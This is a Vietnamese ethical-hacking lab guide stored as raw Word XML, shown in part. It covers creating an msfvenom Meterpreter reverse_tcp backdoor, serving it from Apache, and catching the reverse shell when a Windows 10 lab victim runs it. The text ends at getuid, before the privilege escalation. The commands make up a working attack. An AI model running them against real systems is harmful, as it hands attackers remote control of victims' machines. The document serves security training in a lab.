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E5701" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>BÀI 5.5 – ESCALATING PRIVILEGES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088C9EF4" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Nguồn: Samsar4/Ethical-Hacking-Labs – 5-System-Hacking/5-Escalating-Privileges.md</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BAA519" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Mục tiêu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="345C7B3C" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>Trình diễn cách nâng quyền trên máy nạn nhân bằng cách khai thác lỗ hổng của hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF08DC1" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Môi trường thực hành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10582E" w14:paraId="5BB9F80C" w14:textId="77777777"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597B0099" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Thành phần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5ED2E577" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Thông tin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="7E16ECD5" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="086DBAD5" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Máy thực hiện</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6236" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74A52204" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Kali Linux virtual machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="42559B4D" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5088B179" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>IP Kali</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6236" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="270D3FCE" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.81.136</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="5E91DCF7" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6933AE2A" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Máy mục tiêu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6236" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7EAD6F40" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Windows 10 virtual machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0010582E" w14:paraId="786B7541" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1CD6CD2B" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>IP Windows</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6236" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7789B180" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.81.133</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D7E4542" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="0010582E"/>
    <w:p w14:paraId="0033DE8E" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Các bước thực hiện</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60ED9E70" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1. Create a Backdoor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E41904" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Tạo tệp thực thi và đặt địa chỉ IP Kali vào tùy chọn LHOST:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A066A6" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=192.168.81.136 -f exe &gt; /home/kali/Desktop/Exploit.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8ED0FC" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Lệnh tạo tệp thực thi Windows có tên Exploit.exe và lưu trên Desktop của Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C2D206" w14:textId="4FAD59D4" w:rsidR="0010582E" w:rsidRDefault="000F1C5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="485C0D1B" wp14:editId="6DA58B2C">
            <wp:extent cx="6332220" cy="1112520"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="43014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45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3.2. Share the Exploit.exe file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48000440" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Thiết lập cấu hình Apache và thư mục chia sẻ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AFDD72" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Nếu chưa cài Apache2, chạy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCF4238" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>apt-get install apache2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462C3616" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Mở tệp cấu hình Apache2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2923B85E" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>vim /etc/apache2/apache2.conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A64C7D6" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Thêm dòng sau và lưu tệp:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675346D7" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>servername localhost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01512B24" w14:textId="73F62CC3" w:rsidR="0010582E" w:rsidRDefault="000F1C5E">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46201FD6" wp14:editId="131D7661">
            <wp:extent cx="6332220" cy="2771775"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="72749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931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>
        <w:t>Tạo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>thư</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>mục</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> share trong thư mục html:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F0B084" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>mkdir /var/www/html/share/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B06BEA" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Đổi quyền thư mục share thành 755:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7028C4C9" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>chmod -R 755 /var/www/html/share/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6712543B" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Đổi chủ sở hữu thư mục thành www-data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453651BF" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>chown -R www-data:www-data /var/www/html/share/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEADEF5" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Kiểm tra cấu hình chia sẻ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00783D4A" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ls -la /var/www/html/ | grep share</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD40305" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>drwxr-xr-x 2 www-data www-data 4096 Dec 18 20:52 share</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2384A711" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Sao chép tệp Exploit.exe vào thư mục chia sẻ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330A0AC2" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>cp /home/kali/Desktop/Exploit.exe /var/www/html/share/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234B92ED" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Khởi động dịch vụ Apache:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25505325" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>service apache2 start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A821C32" w14:textId="1964AEEC" w:rsidR="000F1C5E" w:rsidRDefault="000F1C5E">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46974DF4" wp14:editId="348C09DA">
            <wp:extent cx="6332220" cy="3359785"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="18443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72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287C0" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3. Perform Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316E8FA7" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Khởi động Metasploit Framework:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7989D304" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377144BD" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Chọn multi/handler và đặt payload meterpreter/reverse_tcp:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F66E7B2" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>use exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D353C1" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>set payload windows/meterpreter/reverse_tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4106E1" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Đặt LHOST thành địa chỉ IP Kali:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B1B1A4" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>set LHOST 192.168.81.136</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F8BA7D" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Chạy exploit ở chế độ nền:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58174C6A" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>exploit -j -z</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E6646C" w14:textId="35021F98" w:rsidR="0010582E" w:rsidRDefault="00000000" w:rsidP="000F1C5E">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>[*] Exploit running as background job 0.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[*] Exploit completed, but no session was created.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[*] Started reverse TCP handler on 192.168.81.136:4444</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000F1C5E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D82DF0A" wp14:editId="16FE5268">
            <wp:extent cx="6332220" cy="3092450"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1664542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426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3.4. Run the Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA760F8" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Trên Windows 10, mở trình duyệt và truy cập:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3FECDA" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>http://192.168.81.136/share/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726E2A1B" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Nhấn Exploit.exe để tải tệp. Sau khi tải xong, mở tệp để thực thi. Nếu xuất hiện cửa sổ Open File - Security Warning, nhấn Run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F5AF65" w14:textId="27CC2E4B" w:rsidR="0010582E" w:rsidRDefault="000F1C5E">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F18B568" wp14:editId="63CC2F76">
            <wp:extent cx="6332220" cy="4535170"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="38233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377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Quay </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000">
        <w:t>lại</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> Kali. Meterpreter session được mở:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A56AABB" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>[*] Sending stage (180291 bytes) to 192.168.81.133</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>[*] Meterpreter session 1 opened (192.168.81.136:4444 -&gt; 192.168.81.133:49804)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E09748" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Dùng sessions hoặc sessions -i để liệt kê session. Mở session bằng ID:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38188CB5" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sessions &lt;ID&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A7A468" w14:textId="14D81695" w:rsidR="000F1C5E" w:rsidRDefault="000F1C5E">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40E713B1" wp14:editId="146284AC">
            <wp:extent cx="6332220" cy="2421890"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="85855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588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EF7D3" w14:textId="460E25C7" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.5. Establish a Session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A261777" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:t>Mở Meterpreter session hiện tại và kiểm tra User ID:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525F2AD0" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>getuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FA4DB3" w14:textId="77777777" w:rsidR="0010582E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>meterpreter &gt; getuid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
